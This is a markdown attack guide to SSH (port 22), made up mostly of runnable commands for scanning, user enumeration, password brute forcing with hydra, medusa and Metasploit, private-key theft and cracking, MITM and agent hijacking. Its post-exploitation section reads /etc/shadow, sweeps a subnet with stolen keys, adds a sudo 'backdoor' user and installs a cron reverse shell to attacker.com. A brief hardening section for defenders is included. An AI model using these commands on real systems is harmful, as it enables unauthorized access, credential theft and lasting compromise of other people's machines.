# Port 22 - SSH (Secure Shell) - Complete Attack Guide

## 📖 Overview

**Protocol**: SSH (Secure Shell)
**Port**: 22 (default), often moved to alternate ports
**Transport**: TCP
**Encryption**: Yes (strong encryption)
**Authentication**: Password, Public Key, Kerberos, or combinations

## 🎯 Attack Objectives

- **Credential Theft**: Obtain SSH credentials
- **Brute Force**: Crack weak passwords
- **Key Theft**: Steal private SSH keys
- **User Enumeration**: Discover valid usernames
- **Session Hijacking**: Hijack active SSH sessions
- **Man-in-the-Middle**: Intercept SSH connections

## 🔍 Attack Methodology

### Phase 1: Discovery and Enumeration

**1.1 Detect SSH Service**
```bash
# Basic scan
nmap -p 22 192.168.1.100

# Service version detection
nmap -p 22 -sV 192.168.1.100

# Comprehensive SSH scripts
nmap -p 22 --script=ssh-* 192.168.1.100

# Network-wide discovery
nmap -p 22 192.168.1.0/24 --open -oG ssh_hosts.txt
```

**1.2 Banner Grabbing**
```bash
# Using nc
nc 192.168.1.100 22

# Using nmap
nmap -p 22 --script=banner 192.168.1.100

# Using ssh-keyscan
ssh-keyscan 192.168.1.100

# Manual telnet
telnet 192.168.1.100 22
```

**Example Banners**:
```
SSH-2.0-OpenSSH_7.4
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
SSH-1.99-Cisco-1.25
SSH-2.0-libssh_0.7.0
```

**What to Look For**:
- SSH version (1.x is vulnerable, avoid)
- Server software (OpenSSH, Dropbear, libssh)
- Version number (search CVEs)
- OS hints (Ubuntu, Debian, etc.)

**1.3 Supported Authentication Methods**
```bash
# Check auth methods
nmap -p 22 --script=ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100

# Or manually
ssh -v root@192.168.1.100
# Look for: Authentications that can continue: publickey,password
```

**1.4 Host Key Fingerprinting**
```bash
# Get host keys
nmap -p 22 --script=ssh-hostkey 192.168.1.100

# Extract all keys
ssh-keyscan -t rsa,dsa,ecdsa,ed25519 192.168.1.100

# Compare with known_hosts
ssh-keygen -H -F 192.168.1.100
```

### Phase 2: User Enumeration

**2.1 Timing-Based Enumeration**

**How It Works**: SSH responds differently for valid vs invalid users

**Using Metasploit**:
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run
```

**Using Python Script**:
```python
#!/usr/bin/python3
import paramiko
import sys

def check_user(host, username):
    try:
        transport = paramiko.Transport(host)
        transport.connect()
        transport.auth_password(username, "InvalidPassword123")
    except paramiko.AuthenticationException:
        return True  # User exists
    except:
        return False
    finally:
        transport.close()

# Usage: python3 ssh_enum.py 192.168.1.100 userlist.txt
```

**Manual Method**:
```bash
# Time the response
time ssh invaliduser@192.168.1.100
# vs
time ssh root@192.168.1.100
# Different timing may indicate valid username
```

**2.2 OpenSSH < 7.7 - Username Enumeration (CVE-2018-15473)**
```bash
# Using existing exploit
searchsploit openssh 7.7
python ssh_enum.py --port 22 --userList users.txt 192.168.1.100
```

### Phase 3: Brute Force Attacks

**3.1 Password Brute Force**

**When to Use**:
- Weak password policy suspected
- Default credentials possible
- Have valid username(s)
- No account lockout detected

**Using Hydra** (Most Popular):
```bash
# Single user
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Multiple users
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Limit threads (avoid detection)
hydra -l admin -P passwords.txt ssh://192.168.1.100 -t 4

# With specific port
hydra -l root -P passwords.txt ssh://192.168.1.100:2222

# Resume mode (if interrupted)
hydra -l root -P passwords.txt ssh://192.168.1.100 -R
```

**Using Medusa**:
```bash
# Basic attack
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh

# Multiple targets
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh

# Save output
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh -O ssh_results.txt
```

**Using Ncrack**:
```bash
# Single target
ncrack -p 22 --user root -P passwords.txt 192.168.1.100

# Multiple users
ncrack -p 22 -U users.txt -P passwords.txt 192.168.1.100

# Timing control
ncrack -p 22 -u root -P passwords.txt 192.168.1.100 -T 2
```

**Using Metasploit**:
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
set VERBOSE true
run
```

**Using Patator**:
```bash
# Flexible brute forcer
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed'
```

**Brute Force Best Practices**:
1. **Start with common credentials**:
   ```
   root:root
   admin:admin
   root:toor
   admin:password
   user:user
   ```

2. **Use targeted wordlists**:
   ```bash
   # Common SSH passwords
   /usr/share/wordlists/metasploit/unix_passwords.txt
   /usr/share/wordlists/rockyou.txt
   /usr/share/seclists/Passwords/Common-Credentials/
   ```

3. **Limit connection rate**:
   ```bash
   # Avoid detection/lockout
   hydra -t 4 ...  # 4 parallel connections
   ncrack -T 2 ... # Polite timing
   ```

4. **Test for account lockout**:
   ```bash
   # Try 5-10 failed attempts, wait, check if still accessible
   ```

**3.2 SSH Key Attacks**

**A. Private Key Theft**

**Where to Find Keys**:
```bash
# Common locations (if you have file access)
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519

# Check for other users
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# Check for insecure permissions
find / -name id_rsa 2>/dev/null
find / -name "*.pem" 2>/dev/null
```

**B. Crack Encrypted Private Keys**

**Using ssh2john**:
```bash
# Convert to John format
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# Show cracked password
john --show id_rsa.hash
```

**Using JohnTheRipper directly**:
```bash
# If passphrase-protected
john --wordlist=passwords.txt id_rsa
```

**C. Weak Key Generation**

**Check for Debian Weak Keys** (CVE-2008-0166):
```bash
# If key was generated on vulnerable Debian (2006-2008)
# Download weak key database
# Compare against known weak keys
```

### Phase 4: Advanced Attacks

**4.1 SSH MITM Attack**

**Requirements**:
- MITM position (ARP poisoning, rogue gateway, etc.)
- SSH MITM tool

**Using ssh-mitm**:
```bash
# Install
git clone https://github.com/jtesta/ssh-mitm
cd ssh-mitm
./ssh-mitm.py -h

# Run MITM
./ssh-mitm.py --server-host 192.168.1.100 --server-port 22 --listen-port 2222

# Redirect traffic (iptables)
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
```

**User will see**: "Host key verification failed" warning (if they check)

**4.2 Session Hijacking**

**If you have root access on SSH server**:
```bash
# Find active SSH sessions
ps aux | grep sshd

# Attach to SSH session (using screen/tmux if available)
# Or use SSH agent hijacking if agent forwarding enabled
```

**Agent Hijacking**:
```bash
# If SSH agent forwarding enabled (-A flag)
# Find agent socket
ls -la /tmp/ssh-*/agent.*

# Use hijacked agent
SSH_AUTH_SOCK=/tmp/ssh-xxxxx/agent.12345 ssh user@target
```

## 🛡️ Bypass Techniques

### Bypassing SSH Restrictions

**1. Port Knocking Bypass**
```bash
# If SSH protected by port knocking
# Sniff network for knock sequence
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'

# Or try common sequences
knock target.com 1234 5678 9012
```

**2. IP Whitelist Bypass**
```bash
# If SSH restricted by IP
# Use compromised allowed host as proxy
ssh -J allowed_host@192.168.1.50 target@192.168.1.100

# Or SSH tunnel
ssh -L 2222:192.168.1.100:22 user@allowed_host
ssh -p 2222 target@localhost
```

**3. AllowUsers/AllowGroups Bypass**
```bash
# If specific users allowed in sshd_config
# Try default allowed users: root, admin, operator
# Check /etc/ssh/sshd_config if you have read access
```

**4. Password Authentication Disabled**
```bash
# If "PasswordAuthentication no" in sshd_config
# Must use SSH keys
# Look for:
# - Stolen keys
# - Authorized_keys file access
# - SSH agent hijacking
```

### Bypassing Network Filters

**1. SSH over Non-Standard Ports**
```bash
# Scan for SSH on other ports
nmap -p- --script=ssh-* 192.168.1.100

# Common alternate ports
nmap -p 2222,22222,2200,22000 192.168.1.100
```

**2. SSH Tunneling through Allowed Ports**
```bash
# Run SSH on port 443 (HTTPS - often allowed outbound)
# Server side:
sudo /usr/sbin/sshd -p 443

# Client side:
ssh -p 443 user@target.com
```

## 📊 Information Extraction

### After Successful SSH Access

**1. System Enumeration**
```bash
# System info
uname -a
cat /etc/*-release
hostname
id
groups

# Network info
ifconfig -a
ip addr
netstat -tulpn
ss -tulpn

# Users
cat /etc/passwd
cat /etc/shadow  # if root
w                 # logged in users
last              # login history
```

**2. Find Sensitive Files**
```bash
# SSH keys of other users
find /home -name "*.pem" -o -name "id_rsa" 2>/dev/null
cat ~/.ssh/authorized_keys
cat ~/.ssh/config

# Passwords in config files
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Cron jobs (persistence)
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

**3. Lateral Movement**
```bash
# Check for SSH keys to other hosts
cat ~/.ssh/known_hosts
cat ~/.ssh/config

# Try keys on other hosts
for ip in 192.168.1.{1..254}; do
  ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no user@$ip 2>/dev/null
done

# Find other SSH clients
ps aux | grep ssh
```

**4. Establish Persistence**
```bash
# Add your SSH key
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Backdoor user
sudo useradd -m -s /bin/bash backdoor
sudo usermod -aG sudo backdoor
echo "backdoor:password" | sudo chpasswd

# Cron job reverse shell
(crontab -l ; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -
```

## 🔐 Security Recommendations

**For Defenders**:
1. **Disable Root Login**: `PermitRootLogin no`
2. **Use SSH Keys Only**: `PasswordAuthentication no`
3. **Change Default Port**: `Port 2222`
4. **Limit Users**: `AllowUsers user1 user2`
5. **Use Fail2Ban**: Block brute force attempts
6. **Enable 2FA**: Google Authenticator or similar
7. **Disable SSH Protocol 1**: `Protocol 2`
8. **Strong Key Exchange**: Modern algorithms only
9. **Monitor Logs**: `/var/log/auth.log` or `/var/log/secure`
10. **IP Restrictions**: Firewall rules or `AllowUsers user@ip`

**SSH Hardening**:
```bash
# /etc/ssh/sshd_config
Protocol 2
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 20
ClientAliveInterval 300
ClientAliveCountMax 2
AllowUsers user1 user2
```

## ⚠️ Common Mistakes

**Attacker Mistakes**:
1. **Too Aggressive**: Account lockout, IDS alerts
2. **Ignoring Keys**: Focus only on passwords
3. **Not Checking Alternate Ports**: Missing SSH on 2222, etc.
4. **Ignoring SSH Agent**: Missing agent hijacking opportunity
5. **Not Pivoting**: Stop at first host, miss lateral movement

**Defender Mistakes**:
1. **Default Port**: Easy to find
2. **Root Login Enabled**: Instant root if compromised
3. **Password Auth Enabled**: Brute force risk
4. **No Fail2Ban**: No rate limiting
5. **Weak Keys**: Short RSA keys, old algorithms

## 🎯 Practical Attack Scenario

```bash
# Phase 1: Discovery
nmap -p 22 -sV 192.168.1.0/24 --open
# Found: 192.168.1.100 - OpenSSH 7.4

# Phase 2: Enumeration
nmap -p 22 --script=ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
# Result: password,publickey

# Phase 3: User Enumeration
# Try common users: root, admin, user, ubuntu
ssh root@192.168.1.100
# Prompt appears - root exists

# Phase 4: Brute Force
hydra -l root -P rockyou.txt ssh://192.168.1.100 -t 4
# Found: root:password123

# Phase 5: Access
ssh root@192.168.1.100
# Password: password123
# Success!

# Phase 6: Post-Exploitation
uname -a
cat /etc/shadow
find /home -name "id_rsa"
cat /home/user/.ssh/id_rsa
# Found another user's key

# Phase 7: Lateral Movement
ssh -i /home/user/.ssh/id_rsa user@192.168.1.50
# Success - pivoted to another host!

# Phase 8: Persistence
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
```

## 📚 Tools Summary

**Best Tool for Each Task**:
- **Banner Grabbing**: `ssh-keyscan`, `nmap --script=banner`
- **User Enumeration**: Metasploit `ssh_enumusers`, timing attacks
- **Brute Force**: `hydra` (fastest), `medusa` (stable), `ncrack`
- **Key Cracking**: `ssh2john` + `john`
- **MITM**: `ssh-mitm`, `ettercap`
- **Tunneling**: Native `ssh -L/-R/-D`
- **File Transfer**: `scp`, `sftp`, `rsync over SSH`

## 🔗 Related Attacks

- **Port 21 (FTP)**: Try same credentials
- **Port 23 (Telnet)**: Unencrypted alternative
- **Port 3389 (RDP)**: Windows equivalent
- **Port 5900 (VNC)**: Remote desktop alternative

## 📖 Further Reading

- OpenSSH Documentation: https://www.openssh.com/
- SSH RFC 4253: https://www.rfc-editor.org/rfc/rfc4253
- SSH Audit Tool: https://github.com/jtesta/ssh-audit
- SSH Security Best Practices: CIS Benchmarks
